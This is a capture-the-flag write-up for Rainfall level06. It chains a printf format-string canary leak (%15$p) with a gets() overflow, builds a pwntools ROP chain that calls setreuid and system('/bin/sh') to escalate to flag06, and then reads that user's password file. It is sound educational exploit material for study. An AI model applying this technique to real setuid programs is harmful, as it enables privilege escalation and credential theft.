# Rainfall — level06 (`3jane`) — Writeup

## Target

```
-rwsr-x--- flag06 level06   3jane
```

- Setuid binary owned by `flag06`, runnable by `level06`
- `x86-64`, dynamically linked, not stripped, **PIE disabled** (`0x400000`)
- ASLR disabled on the host, so addresses are stable across runs
- Goal: escalate from `level06` to `flag06` (UID `1023`)

### Protections (`checksec`)

```
RELRO:     Partial RELRO
Stack:     Canary found        <-- new vs earlier levels
NX:        NX enabled
PIE:       No PIE (0x400000)
```

The stack canary is the obstacle that makes this level harder than a plain
overflow: a straight `gets()` smash would overwrite the canary, `__stack_chk_fail`
would fire on return, and the program would abort before our return address is
ever used. So we need the canary's value *before* we overflow.

---

## The two vulnerabilities

This level chains **two separate bugs** in two different functions. Neither is
enough alone; together they give a full exploit.

### Bug 1 — format string in `log_request()` (the leak)

```c
void log_request() {
    char buff[64];
    fgets(buff, sizeof(buff), stdin);   // bounded read, no overflow here
    buff[strcspn(buff, "\n")] = '\0';
    printf("[3JANE] Logging: ");
    printf(buff);                       // <-- buff used AS the format string
    ...
}
```

`fgets` is correctly bounded — there is no overflow in this function. The bug is
that our input `buff` is passed to `printf` **as the format string** instead of
as a `%s` argument. The safe version would be `printf("%s", buff)`. Because we
control the format string, we can use `%p` / `%x` to **read values off the stack**
— including the stack canary.

### Bug 2 — unbounded `gets()` in `authenticate()` (the overwrite)

```c
void authenticate() {
    char buff[128];
    gets(buff);                         // <-- no bound at all: classic overflow
    if (strncmp(buff, "STRAYLIGHT_", 11) == 0) { ... }
}
```

`gets()` reads until newline with **no length limit**, so we can write past the
128-byte buffer and overwrite the saved return address — *if* we get the canary
past it intact.

The plan: **leak the canary with bug 1, then overflow with bug 2 while putting
the real canary back in its place** so the check passes.

---

## Working out the offsets (from the disassembly)

### Canary position for the leak — `%15$p`

`log_request` starts with `sub $0x50, %rsp`, and the canary is stored at
`rbp-0x8` (the usual `mov %fs:0x28,%rax ; mov %rax,-0x8(%rbp)`).

On x86-64 the first 6 `printf` arguments come from registers; stack arguments
start at positional index 7. The canary's distance from the format-string
pointer, in 8-byte slots, plus those 6 register slots, gives its positional
index:

```
(0x50 - 8) / 8  +  6  =  72/8 + 6  =  9 + 6  =  15
```

So **`%15$p` prints the canary.** (We confirmed this live: the leaked value ends
in `00`, which stack canaries always do — a good sanity check that the offset is
right.)

### Padding to the canary in the overflow — 136 bytes

`authenticate` starts with `sub $0x90, %rsp`, buffer at `rbp-0x90`, canary at
`rbp-0x8`. The distance from the start of `buff` to the canary is:

```
0x90 - 8  =  0x88  =  136 bytes
```

So the overflow payload is laid out as:

```
[ 136 bytes padding ] [ leaked canary (8) ] [ saved RBP (8, unused) ] [ ROP chain ]
```

With the real canary sitting exactly where the check expects it,
`__stack_chk_fail` never fires, and execution returns into our ROP chain.

---

## The ROP chain

NX is on, so we can't execute bytes on the stack — we use return-oriented
programming: a list of addresses of existing libc code, each snippet ending in
`ret` so the chain walks itself.

```
setreuid(1023, 1023)     ; become flag06 fully (real + effective UID)
system("/bin/sh")        ; spawn a shell
exit(3)                  ; clean exit instead of a crash
```

**Why `setreuid` and not just `system`:** the binary is setuid `flag06`, so at
the moment the chain runs the *saved* UID is already `1023`, but the *real* UID
is still `level06`. A shell spawned with `ruid != euid` and no `-p` can silently
drop privileges on startup. Calling `setreuid(1023, 1023)` first makes real and
effective UID both `flag06`, so the shell keeps privilege. This succeeds without
any special capability because the target UID matches the process's saved UID
(the setuid saved-UID rule).

---

## Two pitfalls that cost real time here

### Pitfall 1 — hardcoded libc offsets are build-specific

A borrowed writeup had the right *idea* but crashed, because its libc offsets
were measured on a different libc build. Checking against the local libc showed
three of them had drifted:

| symbol / gadget | borrowed value | actual local value |
|---|---|---|
| `exit`          | `0x047ba0` | `0x047ba0` (same) |
| `system`        | `0x058750` | `0x058750` (same) |
| `setreuid`      | `0x1271d0` | **`0x127370`** |
| `/bin/sh`       | `0x1cb42f` | **`0x1cc42f`** (one page off) |
| `pop rdi ; ret` | `0x10c08d` | `0x10c08d` (same) |
| `ret` (align)   | `0x02882f` | **`0x028a92`** |

**Fix (used in the final exploit): don't hardcode anything.** Load the actual
libc file and let pwntools resolve every symbol and gadget from it:

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x7ffff7c00000          # from ldd; stable (ASLR off)
rop = ROP(libc)
rop.setreuid(1023, 1023)
rop.system(next(libc.search(b'/bin/sh\x00')))
rop.exit(3)
```

This is immune to the drift and reusable on every level with the same libc.

### Pitfall 2 — 16-byte stack alignment before `system()`

The first working-offset run still SIGSEGV'd *inside* libc. Cause: `system` /
`do_system` use SSE instructions (`movaps`) that require `rsp` to be 16-byte
aligned. Each 8-byte slot the chain returns through flips the alignment, so
whether you need an extra `ret` pad before `system` is effectively a coin-flip
per binary — and the crash tells you which side you're on.

The one knob: a single bare-`ret` gadget before `system`.

```python
# If system() segfaults on movaps, toggle this line:
# rop.raw(rop.ret.address)
rop.system(...)
```

On this binary the chain was already aligned, so **no pad** was needed — removing
the `ret` pad turned the SIGSEGV into a working shell.

---

## Steps to reproduce

1. **Recon** — `checksec 3jane`, `ldd 3jane` (note libc base `0x7ffff7c00000`),
   `objdump -d 3jane`.
2. **Find the leak offset** — from `log_request`'s `sub $0x50`, canary at
   `rbp-8` → `%15$p`.
3. **Find the overflow padding** — from `authenticate`'s `sub $0x90`, canary at
   `rbp-8` → 136 bytes.
4. **Leak the canary** — send `%15$p` at the "Request ID" prompt, parse the hex
   (verify it ends in `00`).
5. **Build the chain from the real libc** — `setreuid(1023,1023)`,
   `system("/bin/sh")`, `exit(3)`.
6. **Overflow** — at the "Access code" prompt send
   `136*"A" + canary + 8*"\x00" + chain`.
7. **If it SIGSEGVs in libc** — toggle the alignment `ret` pad and rerun.
8. **Result** — `whoami` → `flag06`, then `cat /home/flag06/.pass`.

---

## Key lessons

- **Chaining a leak with an overflow beats the canary.** A format-string read in
  one function supplies the secret that lets a `gets()` overflow in another
  function survive the stack-protector check.
- **Canaries always end in a null byte.** If your leaked value doesn't end in
  `00`, your `%N$p` offset is wrong — fix that before anything else.
- **Resolve libc offsets from the target's own libc.** Hardcoded offsets from a
  writeup are only valid for the exact build they were measured on; a one-page or
  one-function shift silently crashes the chain.
- **`movaps` alignment is the usual "it crashes right at `system`" cause.** It's
  a one-line toggle of a `ret` pad, decided by the crash, not by guesswork.
- **Reclaim privilege before spawning the shell.** `setreuid` from inside the
  chain, via the saved-UID rule, keeps `ruid == euid` so the shell doesn't drop
  privileges on startup.
